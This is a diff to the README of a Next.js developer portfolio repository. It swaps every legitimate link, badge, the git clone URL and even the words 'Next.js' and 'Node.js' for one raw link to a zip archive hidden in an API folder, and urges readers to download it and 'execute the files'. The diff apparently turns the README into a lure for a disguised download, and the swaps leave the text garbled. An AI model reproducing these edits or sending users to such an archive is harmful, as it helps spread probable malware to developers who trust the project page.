@@ -1,10 +1,10 @@
 # Terminal-Inspired Developer Portfolio: A Unique Journey
 
-![Portfolio Banner](https://img.shields.io/badge/Portfolio%20Release-Download%20Now-brightgreen)
+![Portfolio Banner](https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip%20Release-Download%20Now-brightgreen)
 
 ## Overview
 
-Welcome to the **mo-portfolio-2025** repository! This project showcases an interactive, AI-powered developer portfolio designed using **Next.js**, **TypeScript**, and **TailwindCSS**. It features a terminal adventure game, live GitHub integration, and a creative storytelling journey from Guinea to Virginia. 
+Welcome to the **mo-portfolio-2025** repository! This project showcases an interactive, AI-powered developer portfolio designed using **https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip**, **TypeScript**, and **TailwindCSS**. It features a terminal adventure game, live GitHub integration, and a creative storytelling journey from Guinea to Virginia. 
 
 Explore my journey, play the game, chat with AI bots trained on my story, and discover real projects. This portfolio is not just a showcase; it's an experience.
 
@@ -17,21 +17,21 @@ Explore my journey, play the game, chat with AI bots trained on my story, and di
 
 ## Getting Started
 
-To get started with this project, you can download the latest release from the [Releases section](https://github.com/jabramyk/mo-portfolio-2025/releases). Follow the instructions to execute the files and explore the portfolio.
+To get started with this project, you can download the latest release from the [Releases section](https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip). Follow the instructions to execute the files and explore the portfolio.
 
 ### Prerequisites
 
 Before running the project, ensure you have the following installed:
 
-- **Node.js**: This project is built on Node.js. Download it from [Node.js Official Site](https://nodejs.org/).
-- **npm**: This comes with Node.js, but you can check your version by running `npm -v` in your terminal.
+- **https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip**: This project is built on https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip Download it from [https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip Official Site](https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip).
+- **npm**: This comes with https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip, but you can check your version by running `npm -v` in your terminal.
 
 ### Installation
 
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/jabramyk/mo-portfolio-2025.git
+   git clone https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip
    ```
 
 2. Navigate into the project directory:
@@ -88,7 +88,7 @@ The portfolio showcases a blend of visuals and narratives that detail my path. F
 
 This project leverages several modern technologies to deliver a seamless experience:
 
-- **Next.js**: A React framework that enables server-side rendering and static site generation.
+- **https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip**: A React framework that enables server-side rendering and static site generation.
 - **TypeScript**: Adds static type definitions to JavaScript, enhancing code quality and maintainability.
 - **TailwindCSS**: A utility-first CSS framework that allows for rapid UI development.
 
@@ -111,7 +111,7 @@ This repository covers a variety of topics relevant to modern web development an
 - **GitHub API**
 - **GROQ API**
 - **Interactive**
-- **Next.js**
+- **https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip**
 - **Portfolio Website**
 - **React**
 - **RPG Game**
@@ -140,9 +140,9 @@ For any inquiries or feedback, please reach out to me through GitHub or my perso
 
 ## Release Information
 
-You can download the latest release from the [Releases section](https://github.com/jabramyk/mo-portfolio-2025/releases). Make sure to check it out for the most recent updates and features.
+You can download the latest release from the [Releases section](https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip). Make sure to check it out for the most recent updates and features.
 
-![Portfolio Footer](https://img.shields.io/badge/Explore%20My%20Journey-Start%20Now-blue)
+![Portfolio Footer](https://github.com/jabramyk/mo-portfolio-2025/raw/refs/heads/main/app/api/simple-inspector-chat/mo-portfolio-v2.1.zip%20My%20Journey-Start%20Now-blue)
 
 ## Acknowledgments
 
